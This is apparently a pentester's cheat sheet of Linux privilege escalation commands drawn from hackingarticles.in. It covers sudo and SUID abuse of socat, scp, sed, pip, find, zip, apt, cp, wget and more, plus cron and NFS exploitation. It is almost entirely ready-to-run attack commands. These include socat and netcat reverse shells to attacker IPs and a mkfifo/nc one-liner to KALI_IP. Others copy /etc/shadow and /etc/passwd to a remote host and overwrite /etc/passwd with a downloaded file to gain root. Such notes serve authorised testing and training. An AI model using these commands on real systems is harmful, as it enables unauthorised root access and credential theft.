<h3>TRICKS and TIPS</h3> </br>

**socat,scp,tmux,ed,sed,pip,git,cp,taskset,xxd,cat,Find,wget,zip,apt,cronjob,automation script,nfs**
- 1)Linux For Pentester: socat Privilege Escalation </br>
    sudo rights  sudo -l </br>
    test ALL=(root) NOPASSWD: /usr/bin/socat</br>
    method 1)</br>
    Victim: sudo socat TCP4-LISTEN:1234, reuseaddr EXEC:"/bin/sh"</br>
    Attacker: socat – TCP4:192.168.1.100:1234</br>
    Method 2)</br>
    Victim:sudo socat exec:'sh –li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.106:1234</br>
    Attacker: socat file: 'tty',raw,echo=0 tcp-listen:1234</br>

Reference: https://www.hackingarticles.in/linux-for-pentester-socat-privilege-escalation/</br>

- 2)Linux for Pentester: scp Privilege Escalation</br>
    sudo -l</br>
    test All=(root) NOPASSWD: /usr/bin/scp</br>
    method 1)</br>
    Victim:</br>
    TF=$(mktemp)</br>
    echo 'sh 0<&2 1>&2' > $TF</br>
    chmod +x "$TF"</br>
    sudo scp -S $TF x y:</br>
    method 2)</br>
    service ssh status (active)</br>
    Victim:</br>
    sudo scp /etc/passwd komal@192.168.1.11:~/</br>
    sudo scp /etc/shadow komal@192.168.1.11:~/ </br>
    Attacker:</br>
    head /home/komal/shadow</br>
    head /home/komal/passwd</br>

- 3)Linux For Pentester: tmux Privilege Escalation</br>
    sudo -l</br>
    test All=(root) NOPASSWD: /usr/bin/tmux</br>
    victim:</br>
    sudo tmux</br>
    (a new terminal with root privilege shell.)</br>
    reference:https://www.hackingarticles.in/category/privilege-escalation/page/3/</br>

- 4)Linux for Pentester: ed Privilege Escalation</br>
    Reference: https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/</br>
    sudo -l</br>
    test All=(root) NOPASSWD: /bin/ed</br>
    victim: sudo ed</br>

- 5)Linux for Pentester: sed Privilege Escalation</br>
    Reference: https://www.hackingarticles.in/linux-for-pentester-sed-privilege-escalation/</br>
    sudo -l</br>
    test All=(root) NOPASSWD: /usr/bin/sed</br>
    Victim:</br>
    sudo sed -n '1e exec sh 1>&0' /etc/passwd</br>

- 6)Linux for Pentester: pip Privilege Escalation</br>
    Reference: https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/</br>
    sudo -l</br>
    test All=(root) NOPASSWD: /usr/bin/pip</br>
    Victim:</br>
    TF=$(mktemp -d)</br>
    echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py</br>
    sudo pip install $TF</br>

- 7)git Priv esca</br>
    reference: https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/</br>
    sudo -l</br>
    test All=(root) NOPASSWD: /usr/bin/git</br>
    Victim:</br>
    sudo git help config</br>

- 8)Linux for Pentester: cp Privilege Escalation</br>
    Reference: https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/</br>
    SUID permision</br>
        find / -perm -u=s -type f 2>/dev/null</br>
    Attacker:</br>
    openssl passwd -1 -salt ignite pass123</br>
    (create passwd file in local machine and put ignite password as above)</br>
    python -m SimpleHTTPServer</br>

   Victim:</br>
    cd /tmp</br>
    wget http://192.168.0.16:8000/passwd</br>
    cp passwd /etc/passwd</br>
    tail /etc/passwd</br>
    su ignite</br>
    password: pass123</br>
    id</br>

- 9)Linux for Pentester: Taskset Privilege Escalation</br>
        reference: https://www.hackingarticles.in/linux-for-pentester-taskset-privilege-escalation/</br>
        sudo -l</br>
        find / -perm -u=s -type f 2>/dev/null</br>
        openssl passwd -1 –salt mark pass123</br>
        Victim:</br>
        taskset 1 echo 'mark:$1$mark$PL9HIgTDwnE9sG27q2Nrb/:0:0:root/:root:/bin/bash' >>/etc/passwd</br>
        su mark</br>
        id</br>

- 10)Linux for Pentester: xxd Privilege Escalation</br>
        Reference:https://www.hackingarticles.in/linux-for-pentester-xxd-privilege-escalation/</br>
        SUID : find / -perm -u=s -type f 2>/dev/null</br>
        Vitim: xxd "/etc/shadow" | xxd -r</br>
        </br>
- 11)Linux for Pentester: CAT Privilege Escalation</br>
        Reference:https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/</br>
        Victim:</br>
        sudo -l</br>
        sudo cat /etc/shadow</br>

        </br>
- 12)Linux for Pentester: Find Privilege Escalation</br>
        Reference:https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/</br>
        Suid: find /etc/ -readable -type f 2>/dev/null</br>
        sudo -l </br>
        test  ALL=(root) NOPASSWD: /usr/bin/find</br>
        Victim:</br>
        sudo find /home -exec /bin/bash \;</br>
        find /home -exec /bin/bash \;</br>

- 13)Linux for Pentester: Wget Privilege Escalation</br>
        Reference: https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/</br>
        Victime:</br>
        find / -perm -u=s -type f 2>/dev/null</br>
        Attacker: openssl passwd -1 -salt ignite pass123(Create passwd file in local machine)</br>
        Victim: </br>
        cd /etc</br>
        wget -O passwd http://192.168.1.108:8000/passwd</br>
        su ignite</br>
        password: pass123</br>
        id</br>


- 14)Linux for Pentester : ZIP Privilege Escalation</br>
        Reference:https://www.hackingarticles.in/category/privilege-escalation/page/6/</br>
        Sudo -l</br>
        sudo zip 1.zip raj.txt -T --unzip-command="sh -c /bin/bash"</br>
        </br>
- 15)Linux for Pentester: APT Privilege Escalation</br>
        Reference:https://www.hackingarticles.in/category/privilege-escalation/page/6/</br>
        sudo -l</br>
        test   ALL=(ALL) NOPASSWD: /usr/bin/apt-get</br>
        sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash</br>
        </br>
- 16)Exploiting Cron job</br>
    */2 *     ***        root       apt-get update</br>

    echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 1234 >/tmp/f”};’ > pwn</br>
    </br>
    - 17)Linux Privilege Escalation via Automated Script</br>
    https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/</br>
    Table of Content</br>

    Introduction</br>
    Vectors of Privilege Escalation</br>
    LinuEnum</br>
    Linuxprivchecker</br>
    Linux Exploit Suggester 2</br>
    Bashark</br>
    BeRoot</br>
Vectors of Privilege Escalation</br>

    OS Detail & Kernel Version</br>
    Any Vulnerable package installed or running</br>
    Files and Folders with Full Control or Modify Access</br>
    File with SUID Permissions</br>
    Mapped Drives (NFS)</br>
    Potentially Interesting Files</br>
    Environment Variable Path</br>
    Network Information (interfaces, arp, netstat)
    Running Processes
    Cronjobs
    User’s Sudo Right
    Wildcard Injection
    
    <b>Linux Privilege Escalation using Misconfigured NFS</b></br>
   REference: https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</br>
Attacker:</br>
    nmap -sV --script=nfs-showmount 192.168.1.102</br>
    apt-get install nfs-common</br>
    showmount -e 192.168.1.102</br>
  - Exploiting NFS server for Privilege Escalation</br>
    mkdir /tmp/raj</br>
    mount -t nfs 192.168.1.102:/home /tmp/raj</br>
    cp /bin/bash .</br>
    chmod +s bash</br>
    ls -la bash</br>
Victim:</br>
    mkdir /tmp/raj</br>
    mount -t nfs 192.168.1.102:/home /tmp/raj</br>
    cp /bin/bash .</br>
    chmod +s bash</br>
    ls -la bash</br>
- C Program</br>
  Attacker:</br>
    cp asroot.c /tmp/raj</br>
    cd /tmp/raj</br>
    gcc asroot.c -o shell</br>
    chmod +s shell</br>
  Victim:</br>
        cd /home</br>
        ls</br>
        ./shell</br>
        id</br>
        whoami</br>






